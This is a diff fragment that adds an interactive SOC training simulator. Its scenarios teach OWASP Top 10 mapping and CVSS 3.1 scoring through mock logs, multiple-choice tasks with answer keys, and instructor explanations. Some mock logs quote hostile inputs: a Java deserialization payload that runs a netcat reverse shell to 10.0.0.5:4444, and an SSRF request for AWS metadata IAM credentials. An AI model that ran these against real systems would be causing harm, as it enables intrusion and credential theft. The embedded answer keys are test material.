+                breakdown: "<h3>Instructor Ledger</h3><div class='vector-string-box'>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L/E:F/RL:U</div><p><strong>A04: Insecure Design</strong>. Unlike implementation bugs, design flaws represent missing structural architecture requirements. The attack vector is public network infrastructure (AV:N/PR:N). Because remediation requires a complete code design rewrite, no immediate patch exists (RL:U).</p>"
+            },
+            // SCENARIO 5: A05 SECURITY MISCONFIGURATION
+            {
+                alert: "An external threat intelligence feed notified your SOC that a company cloud storage container (S3) is globally accessible, and the internal administrative Apache Tomcat console was left facing the internet using default installation credentials.",
+                plainLanguage: "Someone deployed a core admin control panel to the internet and left the default username and password as 'admin/admin'. A hacker easily logged right in with these public credentials and now has administrative rights over your app container.",
+                log: `<span class="log-context"># Edge Firewall Connection Log | Port 8080</span>\n\n114.119.16.5 - "GET /manager/html HTTP/1.1" 401\n114.119.16.5 - "GET /manager/html HTTP/1.1" 200\n<span class="log-highlight">[Authorization: Basic YWRtaW46YWRtaW4=] (Decoded: admin:admin)</span>\n<span class="log-context"># Impact: Attacker gained root application deployment rights.</span>`,
+                logDecoder: [
+  { line: "114.119.16.5 - GET /manager/html - 401", plain: "An external IP hit the Tomcat admin console. Got a 401 (Access Denied) on the first try — the attacker was prompted for credentials." },
+  { line: "114.119.16.5 - GET /manager/html - 200", plain: "One attempt later, they're in. Status 200 means full access granted. The second attempt succeeded almost instantly." },
+  { line: "Authorization: Basic YWRtaW46YWRtaW4= (Decoded: admin:admin)", plain: "The Base64-encoded credential decodes to literally 'admin:admin' — the factory default. The attacker didn't crack anything; they just tried the obvious." },
+  { line: "# Impact: Attacker gained root application deployment rights.", plain: "The Tomcat manager console lets you deploy .WAR files — essentially upload and run any application code. This is full control of the app server." }
+],
+                intel: "<div class='brief-item'><strong>Vulnerability Assessment:</strong> The system was deployed without hardening. The attacker utilized default credentials remotely. The attacker can deploy malicious `.war` files, but current scope is un-escalated beyond the container.</div><div class='brief-item'><strong>Exploit Code Maturity:</strong> Active scanning tools and botnets utilize this vector continuously; the exploit is fully <span class='log-highlight'>functional and widespread</span>.</div><div class='brief-item'><strong>Remediation State:</strong> An <span class='log-highlight'>official remediation step</span> is universally available: change the password and block port 8080.</div>",
+                tasks: {
+                    t1: { q: "Map this vulnerability to the correct OWASP category.", options: ["A01:2021-Broken Access Control", "A05:2021-Security Misconfiguration", "A07:2021-Identification and Authentication Failures", "A09:2021-Security Logging"], ans: 1 },
+                    t2: { q: "Evaluate the log artifacts to isolate the Base Metrics.", options: ["AV:A / PR:L / S:C", "AV:N / PR:H / S:U", "AV:L / PR:H / S:U", "AV:N / PR:N / S:U"], ans: 3 },
+                    t3: { q: "Calibrate the Temporal configuration.", options: ["E:H / RL:T", "E:P / RL:W", "E:F / RL:O", "E:U / RL:U"], ans: 2 },
+                    t4: { q: "What is the IMMEDIATE containment action required?", options: ["Run a comprehensive code review on the Tomcat source.", "Implement MFA for all domain users.", "Block external internet access to port 8080 and reset the default credentials.", "Re-issue SSL certificates for the load balancer."], ans: 2 }
+                },
+                assist: `<div class="assist-subtitle">Why this maps to A05:2021-Security Misconfiguration</div>
+                <div class="assist-section">Leaving default application configurations (like <code>admin:admin</code>) active and exposing unhardened administrative paths to public routes directly defines <strong>Security Misconfiguration</strong>.</div>
+                <div class="assist-subtitle">Why Base Metrics are AV:N / PR:N / S:U</div>
+                <div class="assist-section">
+                    • <strong>Attack Vector (Network):</strong> Exploited remotely over the internet via port 8080.<br>
+                    • <strong>Privileges Required (None):</strong> *EXAM TRAP:* CVSS 3.1 rules state that using universally known, default out-of-the-box credentials scores as Privileges Required: None (PR:N) because the attacker did not need to be provisioned a unique system identity context.<br>
+                    • <strong>Scope (Unchanged):</strong> Currently confined to the Tomcat container wrapper process boundaries.
+                </div>
+                <div class="assist-subtitle">Why Temporal & Containment are E:F / RL:O / Firewall Blocks</div>
+                <div class="assist-section">Widespread automated botnet traffic sets maturity to <strong>Functional (E:F)</strong>. Shifting configuration settings maps to an <strong>Official Remediation (RL:O)</strong> path. Immediate containment dictates modifying firewall rule lists to close the management port to the public.</div>`,
+                breakdown: "<h3>Instructor Ledger</h3><div class='vector-string-box'>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H/E:F/RL:O</div><p><strong>A05: Security Misconfiguration</strong>. Out-of-the-box system configurations are security flaws. CVSS guidelines mandate that default credentials require zero specialized privilege profiling (PR:N). Closing public management access paths immediately contains further exploitation vectors.</p>"
+            },
+            // SCENARIO 6: A06 VULNERABLE COMPONENTS
+            {
+                alert: "During an automated Software Composition Analysis (SCA) pipeline scan, the system identified a legacy Java logging library embedded deeply within the billing application stack that is actively vulnerable to unauthenticated Remote Code Execution (RCE).",
+                plainLanguage: "Your billing software is running an old, unpatched version of an open-source Java library (Log4j). A hacker can use this known weak link over the internet to break entirely out of the application and execute commands directly on the server's main operating system.",
+                log: `<span class="log-context"># Build Pipeline SCA Report | Component: log4j-core</span>\n\nDependency Tree Match:\n<span class="log-highlight">-> org.apache.logging.log4j:log4j-core:2.14.0 (VULNERABLE)</span>\n<span class="log-context"># Threat Vector: Allows unauthenticated JNDI injection escaping the application sandbox to execute host OS shell commands.</span>`,
+                logDecoder: [
+  { line: "Build Pipeline SCA Report | Component: log4j-core", plain: "This comes from an automated Software Composition Analysis scan — a tool that checks every library your code depends on against known vulnerability databases." },
+  { line: "-> org.apache.logging.log4j:log4j-core:2.14.0 (VULNERABLE)", plain: "The scan found Log4j version 2.14.0 buried in the dependency tree. The arrow (→) means it's a transitive dependency — your code pulled it in through another library, so you might not even know it's there." },
+  { line: "Threat Vector: JNDI injection escaping the application sandbox to execute host OS shell commands.", plain: "Log4Shell. An attacker can send a specially crafted string that Log4j will log, which triggers an outbound lookup that fetches and runs attacker-controlled code — escaping the app entirely to run commands on the server's OS." }
+],
+                intel: "<div class='brief-item'><strong>Vulnerability Assessment:</strong> The application relies on an external, outdated component. Attackers can execute arbitrary code over the internet without authentication, resulting in a <span class='log-highlight'>full escape to the host OS (Scope Change)</span>.</div><div class='brief-item'><strong>Exploit Code Maturity:</strong> The vulnerability is actively weaponized by ransomware gangs globally (<span class='log-highlight'>High maturity</span>).</div><div class='brief-item'><strong>Remediation State:</strong> The Apache foundation has released an <span class='log-highlight'>official patch</span> (version 2.17.1).</div>",
+                tasks: {
+                    t1: { q: "Which OWASP category identifies the failure to patch third-party libraries?", options: ["A03:2021-Injection", "A06:2021-Vulnerable and Outdated Components", "A08:2021-Software and Data Integrity", "A10:2021-SSRF"], ans: 1 },
+                    t2: { q: "Derive the correct Base Metrics emphasizing the OS sandbox escape.", options: ["AV:N / PR:N / S:C", "AV:N / PR:L / S:U", "AV:A / PR:N / S:C", "AV:L / PR:H / S:U"], ans: 0 },
+                    t3: { q: "Calibrate the Temporal configuration.", options: ["E:U / RL:W", "E:F / RL:T", "E:H / RL:O", "E:P / RL:U"], ans: 2 },
+                    t4: { q: "Which action permanently mitigates the root cause?", options: ["Disable the server's external internet connection.", "Update the dynamic build manifests to force dependency resolution to the officially patched package version.", "Deploy a network intrusion detection system.", "Change the administrative root passwords on the Linux server."], ans: 1 }
+                },
+                assist: `<div class="assist-subtitle">Why this maps to A06:2021-Vulnerable and Outdated Components</div>
+                <div class="assist-section">Deploying software modules built upon unpatched dependency frameworks (like Log4j 2.14.0) maps precisely to <strong>Vulnerable and Outdated Components</strong>.</div>
+                <div class="assist-subtitle">Why Base Metrics are AV:N / PR:N / S:C</div>
+                <div class="assist-section">
+                    • <strong>Attack Vector (Network):</strong> Targeted over public endpoints.<br>
+                    • <strong>Privileges Required (None):</strong> Open pathways accept strings without login blocks.<br>
+                    • <strong>Scope (Changed):</strong> <span style="color:var(--accent);font-weight:700;">⚠ CRITICAL CYSA+ ANCHOR:</span> Because the exploit permits the threat actor to break out of the application container and execute structural commands on the underlying host operating system shell, the security authority shifts, proving a <strong>Scope Change (S:C)</strong>.
+                </div>
+                <div class="assist-subtitle">Why Temporal & Remediation are E:H / RL:O / Build Manifest Update</div>
+                <div class="assist-section">Active worldwide execution by ransomware gangs sets maturity to <strong>High (E:H)</strong>. Upgrading the underlying package dependency line item inside manifest trees (like <code>pom.xml</code> or <code>package.json</code>) permanently removes the vector via an <strong>Official Patch (RL:O)</strong>.</div>`,
+                breakdown: "<h3>Instructor Ledger</h3><div class='vector-string-box'>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H/E:H/RL:O</div><p><strong>A06: Vulnerable Components</strong>. Relying on legacy dependencies introduces un-hardened vectors. Because the payload escapes the software runtime envelope to control the operating system layer, Scope is Changed (S:C). Root-cause correction dictates upgrading the package manifests.</p>"
+            },
+            // SCENARIO 7: A07 AUTHENTICATION FAILURES
+            {
+                alert: "The SOC observes a massive, distributed credential stuffing attack against the `/login` endpoint. Thousands of login attempts are originating from different IPs, utilizing lists of usernames and passwords breached from third-party websites.",
+                plainLanguage: "An automated hacker botnet is hammering your login page over the network, trying thousands of leaked username/password combinations. Because your application lacks a login rate limit or lock-out policy, the bots are free to keep trying until they break into a real account.",
+                log: `<span class="log-context"># Authentication Daemon Logs | Status: Active Attack</span>\n\n188.166.x.x - "POST /login" <span class="log-highlight">HTTP 401 Unauthorized (user: admin@corp.com)</span>\n134.209.x.x - "POST /login" <span class="log-highlight">HTTP 401 Unauthorized (user: test@corp.com)</span>\n<span class="log-highlight">[Warning: No rate limiting or lockout policy triggered after 10,000 requests.]</span>`,
+                logDecoder: [
+  { line: "# Authentication Daemon Logs | Status: Active Attack", plain: "The auth service itself is flagging this as an ongoing attack in real time." },
+  { line: "188.166.x.x - POST /login - 401 (user: admin@corp.com)", plain: "One IP tried to log in as admin@corp.com and failed. The x.x means the IPs are randomized — this is a distributed botnet, not one machine." },
+  { line: "134.209.x.x - POST /login - 401 (user: test@corp.com)", plain: "Different IP, different username. These credentials came from a previously leaked breach database, not a random guess." },
+  { line: "[Warning: No rate limiting or lockout policy triggered after 10,000 requests.]", plain: "Ten thousand failed logins and not a single automated defense kicked in. No lockout, no CAPTCHA, no slowdown. The door is wide open for the bots to keep going." }
+],
+                intel: "<div class='brief-item'><strong>Vulnerability Assessment:</strong> The application fails to defend against automated brute-forcing by external unauthenticated actors. Impact is limited to compromised user accounts (Scope Unchanged).</div><div class='brief-item'><strong>Exploit Code Maturity:</strong> Credential stuffing tools like 'Sniper' are <span class='log-highlight'>functional and ubiquitous</span>.</div><div class='brief-item'><strong>Remediation State:</strong> While the application lacks an official patch, administrators can deploy a <span class='log-highlight'>temporary WAF workaround</span> to throttle login attempts per minute.</div>",
+                tasks: {
+                    t1: { q: "Map this brute-force vulnerability to the correct OWASP category.", options: ["A01:2021-Broken Access Control", "A04:2021-Insecure Design", "A07:2021-Identification and Authentication Failures", "A09:2021-Security Logging"], ans: 2 },
+                    t2: { q: "Derive the base metrics profile for this credential attack.", options: ["AV:N / PR:H / S:C", "AV:N / PR:N / S:U", "AV:L / PR:L / S:U", "AV:A / PR:N / S:C"], ans: 1 },
+                    t3: { q: "Calibrate the Temporal configuration.", options: ["E:U / RL:O", "E:H / RL:U", "E:P / RL:T", "E:F / RL:W"], ans: 3 },
+                    t4: { q: "What is the most effective immediate mitigation against credential stuffing?", options: ["Implement strict IP blocking for the single attacking IP.", "Enforce aggressive account lockout thresholds and CAPTCHA challenges.", "Rotate all TLS certificates.", "Switch the database to a NoSQL architecture."], ans: 1 }
+                },
+                assist: `<div class="assist-subtitle">Why this maps to A07:2021-Identification and Authentication Failures</div>
+                <div class="assist-section">Failing to counter automated password guessing, credential stuffing, or missing MFA validation controls maps directly to <strong>Identification and Authentication Failures</strong>.</div>
+                <div class="assist-subtitle">Why Base Metrics are AV:N / PR:N / S:U</div>
+                <div class="assist-section">
+                    • <strong>Attack Vector (Network):</strong> Queries route across public network lines.<br>
+                    • <strong>Privileges Required (None):</strong> The actor attempts to guess passwords, meaning they have no active privileges yet.<br>
+                    • <strong>Scope (Unchanged):</strong> Impact is restricted purely to individual consumer credential records.
+                </div>
+                <div class="assist-subtitle">Why Temporal & IR are E:F / RL:W / Threshold Controls</div>
+                <div class="assist-section">Pre-built spray toolsets match <strong>Functional (E:F)</strong>. Custom WAF rate throttling rules serve as a valid <strong>Workaround (RL:W)</strong>. Implementing localized lockouts and CAPTCHA barriers stops automation from exhausting authentication buffers.</div>`,
+                breakdown: "<h3>Instructor Ledger</h3><div class='vector-string-box'>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N/E:F/RL:W</div><p><strong>A07: Authentication Failures</strong>. Lack of systemic login throttling exposes verification pathways. Attackers require no initial valid credentials (PR:N). Deploying progressive challenge checks (CAPTCHA) breaks the automated stuffing loops immediately.</p>"
+            },
+            // SCENARIO 8: A08 INTEGRITY FAILURES
+            {
+                alert: "Your EDR triggered an alert on a backend processing server. The server accepts serialized data from users without verifying digital signatures. The attacker embedded a malicious executable command inside the serialized Java object.",
+                plainLanguage: "Your server accepts raw data objects from users without verifying who signed them or if they were modified. A hacker edited one of these objects to include a hidden backdoor command line script, and your server ran it automatically.",
+                log: `<span class="log-context"># Payload Inspection | Endpoint: /api/deserialize</span>\n\nHTTP POST /api/deserialize\nContent-Type: application/x-java-serialized-object\n\n<span class="log-highlight">Payload: rO0ABXNyADJvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMu...[exec('bash -c "nc 10.0.0.5 4444"')]</span>\n<span class="log-context"># Impact: System executed reverse shell payload as root.</span>`,
+                logDecoder: [
+  { line: "HTTP POST /api/deserialize", plain: "An HTTP POST to an endpoint that accepts serialized data — meaning the app is designed to receive and reconstruct objects sent from outside." },
+  { line: "Content-Type: application/x-java-serialized-object", plain: "This content type tells the server to treat the body as a raw Java object. The server will unpack and execute it without asking what's inside." },
+  { line: "Payload: rO0ABXNy... (Java serialization magic bytes)", plain: "rO0AB is the fingerprint of a Java serialized stream. The payload is a malicious object (Apache Commons gadget chain) crafted to execute a command when deserialized." },
+  { line: "[exec('bash -c nc 10.0.0.5 4444')]", plain: "The embedded command opens a reverse shell — it connects the victim server outbound to the attacker's machine on port 4444, giving them an interactive terminal." },
+  { line: "# Impact: System executed reverse shell payload as root.", plain: "The server ran it. As root. The attacker now has full OS-level command execution on the host." }
+],
+                intel: "<div class='brief-item'><strong>Vulnerability Assessment:</strong> The system trusts external data implicitly. The deserialization payload allows unauthenticated internet actors to <span class='log-highlight'>change scope and execute commands on the host OS</span>.</div><div class='brief-item'><strong>Exploit Code Maturity:</strong> Researchers published a theoretical <span class='log-highlight'>Proof-of-Concept</span> script, but it requires heavy modification to work on this specific app.</div><div class='brief-item'><strong>Remediation State:</strong> The software vendor has released an <span class='log-highlight'>official patch</span> forcing digital signature checks.</div>",
+                tasks: {
+                    t1: { q: "Map Insecure Deserialization and missing digital signatures to the OWASP Top 10.", options: ["A02:2021-Cryptographic Failures", "A03:2021-Injection", "A08:2021-Software and Data Integrity Failures", "A10:2021-SSRF"], ans: 2 },
+                    t2: { q: "Derive the Base Metrics capturing the reverse shell impact.", options: ["AV:N / PR:N / S:C", "AV:A / PR:L / S:U", "AV:N / PR:H / S:C", "AV:L / PR:N / S:U"], ans: 0 },
+                    t3: { q: "Calibrate the Temporal configuration based on the Intel brief.", options: ["E:F / RL:W", "E:P / RL:O", "E:H / RL:T", "E:U / RL:U"], ans: 1 },
+                    t4: { q: "How should software and data integrity be permanently verified?", options: ["Base64 encode all data streams.", "Ensure all serialized data or firmware updates are cryptographically signed and validated before execution.", "Deploy a secondary firewall rule.", "Disable Java completely on all client machines."], ans: 1 }
+                },
+                assist: `<div class="assist-subtitle">Why this maps to A08:2021-Software and Data Integrity Failures</div>
+                <div class="assist-section">Parsing raw serialization blocks without verifying object authenticity or digital source tokens falls directly into <strong>Software and Data Integrity Failures</strong>. Look for <code>rO0AB</code> magic bytes indicating Java serialization streams.</div>
+                <div class="assist-subtitle">Why Base Metrics are AV:N / PR:N / S:C</div>
+                <div class="assist-section">
+                    • <strong>Attack Vector (Network):</strong> Pushed remotely across web input bounds.<br>
+                    • <strong>Privileges Required (None):</strong> Stream structures are parsed before identity assignment checking.<br>
+                    • <strong>Scope (Changed):</strong> Spawning a backdoor command shell context transfers execution parameters to the core host machine context, establishing a Scope Change.
+                </div>
+                <div class="assist-subtitle">Why Temporal & Mitigation are E:P / RL:O / Cryptographic Signing</div>
+                <div class="assist-section">Theoretical validation code matches <strong>Proof-of-Concept (E:P)</strong>. Vendor-enforced checking maps to an <strong>Official Patch (RL:O)</strong>. Structural long-term containment demands cryptography signing validations across every object initialization pathway.</div>`,
+                breakdown: "<h3>Instructor Ledger</h3><div class='vector-string-box'>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H/E:P/RL:O</div><p><strong>A08: Software & Data Integrity Failures</strong>. Insecure deserialization is the textbook example. Attacking public endpoints handles as AV:N/PR:N. Code spawning shifts execution boundaries, forcing Scope: Changed (S:C).</p>"
+            },
+            // SCENARIO 9: A09 LOGGING FAILURES
+            {
+                alert: "During a post-breach forensic audit, the Incident Response team discovered that an attacker resided on the network for 45 days. No alerts were generated because critical database modification events were never configured to forward to the centralized SIEM.",
+                plainLanguage: "An intruder snuck into your local database system and stayed active for 45 days. No one noticed because your database configuration explicitly had data deletion logs turned OFF, creating a total blind spot for your security team.",
+                log: `<span class="log-context"># Database Audit Configuration Policy</span>\n\n[Security_Audit_Policy]\nlog_logins = ON\n<span class="log-highlight">log_data_modifications (UPDATE/DELETE) = OFF</span>\nremote_syslog_forwarding = DISABLED\n<span class="log-context"># Alerting: 0 alerts generated during data exfiltration phase.</span>`,
+                logDecoder: [
+  { line: "[Security_Audit_Policy]", plain: "This is the database engine's audit configuration — the ruleset that defines what activity gets recorded." },
+  { line: "log_logins = ON", plain: "Login events ARE being recorded. The organization would know if someone's credentials were used to authenticate." },
+  { line: "log_data_modifications (UPDATE/DELETE) = OFF", plain: "But data changes — the actual damage — are NOT logged. An attacker can modify or delete records and leave zero trace in the database audit trail." },
+  { line: "remote_syslog_forwarding = DISABLED", plain: "Logs aren't being sent to the central SIEM either. Even the logs that do exist never leave this box — so the SOC is completely blind." },
+  { line: "# Alerting: 0 alerts generated during data exfiltration phase.", plain: "Result: the attacker operated for 45 days with no alerts. No log = no detection = no response." }
+],
+                intel: "<div class='brief-item'><strong>Vulnerability Assessment:</strong> The lack of visibility allowed the attacker to operate undetected. This is an internal configuration flaw requiring administrative access to alter logs (Scope Unchanged).</div><div class='brief-item'><strong>Exploit Code Maturity:</strong> Exploiting blind spots is <span class='log-highlight'>functional and standard practice</span> in all active threats.</div><div class='brief-item'><strong>Remediation State:</strong> Administrators have an <span class='log-highlight'>official remediation</span> path by simply enabling the logging configuration parameters natively.</div>",
+                tasks: {
+                    t1: { q: "Which OWASP category identifies the failure to detect active breaches due to missing telemetry?", options: ["A01:2021-Broken Access Control", "A05:2021-Security Misconfiguration", "A09:2021-Security Logging and Monitoring Failures", "A10:2021-SSRF"], ans: 2 },
+                    t2: { q: "Derive the Base Metrics for manipulating local log configurations.", options: ["AV:L / PR:H / S:U", "AV:N / PR:N / S:C", "AV:A / PR:L / S:U", "AV:N / PR:N / S:U"], ans: 0 },
+                    t3: { q: "Calibrate the Temporal configuration.", options: ["E:U / RL:W", "E:F / RL:O", "E:P / RL:T", "E:H / RL:U"], ans: 1 },
+                    t4: { q: "What is the primary architectural fix for logging failures?", options: ["Encrypt local log files.", "Enable comprehensive audit trails and forward all events securely to a centralized SIEM hub.", "Deploy an antivirus scanner on the database.", "Change all user passwords monthly."], ans: 1 }
+                },
+                assist: `<div class="assist-subtitle">Why this maps to A09:2021-Security Logging and Monitoring Failures</div>
+                <div class="assist-section">Failing to trace data manipulation events, disabling log forwarding, or operating without proactive telemetry defines <strong>Security Logging and Monitoring Failures</strong>. This represents a critical risk multiplier.</div>
+                <div class="assist-subtitle">Why Base Metrics are AV:L / PR:H / S:U</div>
+                <div class="assist-section">
+                    • <strong>Attack Vector (Local):</strong> Configuration hardening adjustments happen directly via host administration access vectors.<br>
+                    • <strong>Privileges Required (High):</strong> Turning database audit engines off requires highly elevated database owner or root system administration tokens.<br>
+                    • <strong>Scope (Unchanged):</strong> Configuration shifts modify the internal system parameters, keeping scope Unchanged.
+                </div>
+                <div class="assist-subtitle">Why Temporal & Remediation are E:F / RL:O / SIEM Forwarding</div>
+                <div class="assist-section">Standard persistence visibility suppression maps to <strong>Functional (E:F)</strong>. Fixing configuration parameters natively constitutes an <strong>Official Patch (RL:O)</strong> mechanism. Long-term correction demands centralized SIEM event synchronization.</div>`,
+                breakdown: "<h3>Instructor Ledger</h3><div class='vector-string-box'>CVSS:3.1/AV:L/AC:L/PR:H/UI:N/S:U/C:N/I:L/A:N/E:F/RL:O</div><p><strong>A09: Security Logging & Monitoring</strong>. Telemetry omission hides post-exploitation changes. Disabling underlying auditing tracks typically demands advanced administrative context (PR:H) executed locally (AV:L). Resolving the tracking deficiency permanently requires forwarding logging parameters to a SIEM engine.</p>"
+            },
+            // SCENARIO 10: A10 SSRF
+            {
+                alert: "A cloud workload protection platform detected the public-facing corporate web server making strange outbound HTTP GET requests to the internal AWS EC2 Instance Metadata IP address (169.254.169.254).",
+                plainLanguage: "A hacker is tricking your public web server into acting as a proxy. The attacker tells your web app to look at a secret cloud web address (the AWS metadata IP), and the web app fetches the cloud root administrative access keys and hands them back to the attacker.",
+                log: `<span class="log-context"># Web Server Outbound Proxy Log</span>\n\nAttacker Input: POST /webhook?url=<span class="log-highlight">http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role</span>\n<span class="log-context">Server Action: Web server processed URL and queried the internal cloud API.</span>\n<span class="log-highlight">Impact: Server returned temporary AWS IAM cloud keys back to the external attacker.</span>`,
+                logDecoder: [
+  { line: "Attacker Input: POST /webhook?url=http://169.254.169.254/...", plain: "The attacker submitted a URL as input to the web app's webhook feature. Instead of a legitimate external URL, they pointed it at 169.254.169.254 — the AWS metadata service, only reachable from inside the cloud environment." },
+  { line: "Server Action: Web server processed URL and queried the internal cloud API.", plain: "The web app blindly fetched whatever URL it was given. Because the server lives inside AWS, it could reach the metadata endpoint — something the attacker's own computer cannot do directly." },
+  { line: "Impact: Server returned temporary AWS IAM cloud keys back to the external attacker.", plain: "The metadata service returned live IAM credentials (Access Key, Secret Key, Session Token). The web app passed them straight back to the attacker. Those keys can now be used to access S3 buckets, EC2 instances, and other cloud resources." }
+],
+                intel: "<div class='brief-item'><strong>Vulnerability Assessment:</strong> The application fetches remote resources without validating the user-supplied URL. An unauthenticated external attacker forced the web app to <span class='log-highlight'>change scope and attack the internal cloud infrastructure layer</span>.</div><div class='brief-item'><strong>Exploit Code Maturity:</strong> Cloud metadata SSRF scripts are <span class='log-highlight'>functional and widely used</span> by modern threat actors.</div><div class='brief-item'><strong>Remediation State:</strong> While the app requires a code update, network admins applied a <span class='log-highlight'>temporary workaround</span> by blocking traffic to 169.254.169.254 at the host firewall.</div>",
+                tasks: {
+                    t1: { q: "Which OWASP category identifies an app being tricked into making unauthorized internal requests?", options: ["A03:2021-Injection", "A04:2021-Insecure Design", "A08:2021-Software and Data Integrity", "A10:2021-Server-Side Request Forgery (SSRF)"], ans: 3 },
+                    t2: { q: "Derive the Base Metrics emphasizing the pivot to the cloud layer.", options: ["AV:A / PR:L / S:U", "AV:N / PR:N / S:C", "AV:L / PR:H / S:C", "AV:N / PR:N / S:U"], ans: 1 },
+                    t3: { q: "Calibrate the Temporal configuration.", options: ["E:U / RL:O", "E:P / RL:T", "E:F / RL:W", "E:H / RL:U"], ans: 2 },
+                    t4: { q: "What is a robust, long-term mitigation for SSRF?", options: ["Implement an allow-list of permitted domains for URL fetching and upgrade to IMDSv2.", "Disable all HTTP POST requests.", "Encrypt the web server database.", "Deploy a legacy anti-virus agent."], ans: 0 }
+                },
+                assist: `<div class="assist-subtitle">Why this maps to A10:2021-Server-Side Request Forgery (SSRF)</div>
+                <div class="assist-section">Coercing a remote server into proxying arbitrary backend connection lookup vectors (specifically targeting local loops or cloud properties like <code>169.254.169.254</code>) defines <strong>Server-Side Request Forgery (SSRF)</strong>.</div>
+                <div class="assist-subtitle">Why Base Metrics are AV:N / PR:N / S:C</div>
+                <div class="assist-section">
+                    • <strong>Attack Vector (Network):</strong> Exploited directly over standard remote web input vectors.<br>
+                    • <strong>Privileges Required (None):</strong> Public parameters accept incoming queries without authentication checks.<br>
+                    • <strong>Scope (Changed):</strong> <span style="color:var(--accent);font-weight:700;">⚠ CRITICAL STRATEGIC ANCHOR:</span> Because the exploitation vehicle shifts attack capability from the web application engine to the cloud hypervisor control infrastructure layer (exfiltrating AWS IAM tokens), the target security jurisdiction transfers, proving a <strong>Scope Change (S:C)</strong>.
+                </div>
+                <div class="assist-subtitle">Why Temporal & Mitigation are E:F / RL:W / IMDSv2</div>
+                <div class="assist-section">Ubiquitous scanner scripts establish <strong>Functional (E:F)</strong> maturity. Local host-level firewall link blocks act as an emergency <strong>Workaround (RL:W)</strong>. Long-term code engineering mandates allow-listing domains and forcing IMDSv2 session-based validation protocols.</div>`,
+                breakdown: "<h3>Instructor Ledger</h3><div class='vector-string-box'>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N/E:F/RL:W</div><p><strong>A10: SSRF</strong>. The threat actor abuses the server's trusted position within the perimeter. The remote unauthenticated exploit (AV:N/PR:N) hits cloud IAM layers, driving a Scope Change (S:C). Moving cloud boundaries to IMDSv2 requires token headers, blocking the proxy reflection natively.</p>"
+            }
+        ];
+
+        let currentScenarioIndex = 0;
+
+        function loadScenario(index) {
+            currentScenarioIndex = parseInt(index);
+            const sc = scenarios[currentScenarioIndex];
+
+            document.getElementById("alert-text").innerHTML = sc.alert;
+            document.getElementById("plain-language-text").innerHTML = "<strong>What this means in plain language:</strong> " + sc.plainLanguage;
+            document.getElementById("log-artifact").innerHTML = sc.log;
+            document.getElementById("intel-text").innerHTML = sc.intel;
+
+            // Render line-by-line log decoder
+            const decoderContainer = document.getElementById("log-decoder-rows");
+            if (sc.logDecoder && sc.logDecoder.length > 0) {
+                decoderContainer.innerHTML = sc.logDecoder.map(entry => `
+                    <div class="decoder-row">
+                        <div class="decoder-raw">${entry.line}</div>
+                        <div class="decoder-plain">${entry.plain}</div>
+                    </div>
+                `).join('');
+            } else {
+                decoderContainer.innerHTML = '';
+            }
+
+            setupTaskRadioButtons("options-task1", "t1", sc.tasks.t1.q, sc.tasks.t1.options);
+            setupTaskRadioButtons("options-task2", "t2", sc.tasks.t2.q, sc.tasks.t2.options);
+            setupTaskRadioButtons("options-task3", "t3", sc.tasks.t3.q, sc.tasks.t3.options);
+            setupTaskRadioButtons("options-task4", "t4", sc.tasks.t4.q, sc.tasks.t4.options);
+
+            document.getElementById("status-banner").style.display = "none";
+            const clearClasses = ["correct-highlight", "incorrect-highlight"];
+            ["card-task1", "card-task2", "card-task3", "card-task4"].forEach(id => {
+                document.getElementById(id).classList.remove(...clearClasses);
+            });
+        }
+
+        function setupTaskRadioButtons(containerId, taskKey, questionText, options) {
+            const container = document.getElementById(containerId);
+            let html = `<p style="font-size:0.95rem; margin-bottom:14px; font-weight:600; line-height:1.5; color:var(--text-main);">${questionText}</p>`;
+            options.forEach((opt, idx) => {
+                html += `
+                    <label class="option-label">
+                        <input type="radio" name="${taskKey}" value="${idx}">
+                        <span>${opt}</span>
+                    </label>
+                `;
+            });
+            container.innerHTML = html;
+        }
+
+        function switchTab(evt, tabId) {
+            const tabcontents = document.getElementsByClassName("tab-content");
+            for (let i = 0; i < tabcontents.length; i++) {
+                tabcontents[i].style.display = "none";
+            }
+            const tabs = document.getElementsByClassName("tab");
+            for (let i = 0; i < tabs.length; i++) {
+                tabs[i].classList.remove("active");
+            }
+            document.getElementById(tabId).style.display = "block";
+            evt.currentTarget.classList.add("active");
+        }
+
+        function openAssistModal() {
+            const sc = scenarios[currentScenarioIndex];
+            document.getElementById("assist-title").innerText = `Instructor Guidance Node — Scenario ${currentScenarioIndex + 1}`;
+            document.getElementById("assist-content").innerHTML = sc.assist;
+            document.getElementById("assist-modal").style.display = "flex";
+        }
+
+        function closeModal(modalId) {
+            document.getElementById(modalId).style.display = "none";
+        }
+
+        function gradeSimulation() {
+            const sc = scenarios[currentScenarioIndex];
+            let allCorrect = true;
+            const keys = ["t1", "t2", "t3", "t4"];
+            const cardIds = ["card-task1", "card-task2", "card-task3", "card-task4"];
+
+            keys.forEach((key, index) => {
+                const selected = document.querySelector(`input[name="${key}"]:checked`);
+                const card = document.getElementById(cardIds[index]);
+                
+                card.classList.remove("correct-highlight", "incorrect-highlight");
+
+                if (selected && parseInt(selected.value) === sc.tasks[key].ans) {
+                    card.classList.add("correct-highlight");
+                } else {
+                    card.classList.add("incorrect-highlight");
+                    allCorrect = false;
+                }
+            });
+
+            const banner = document.getElementById("status-banner");
+            banner.style.display = "block";
+
+            if (allCorrect) {
+                banner.style.backgroundColor = "rgba(34, 197, 94, 0.15)";
+                banner.style.color = "#4ade80";
+                banner.style.borderColor = "var(--success)";
+                banner.innerText = "SUCCESS: All structural vulnerability mappings and CVSS profiles match official validations.";
+            } else {
+                banner.style.backgroundColor = "rgba(239, 68, 68, 0.15)";
+                banner.style.color = "#f87171";
+                banner.style.borderColor = "var(--error)";
+                banner.innerText = "CRITICAL METRIC MISALIGNMENT: Vector parameters are incongruent. Review the instructor analysis ledger.";
+            }
+
+            document.getElementById("breakdown-content").innerHTML = sc.breakdown;
+            document.getElementById("breakdown-modal").style.display = "flex";
+        }
+
+        window.onload = function() {
+            loadScenario(0);
+        };
+    </script>
+</body>
+</html>
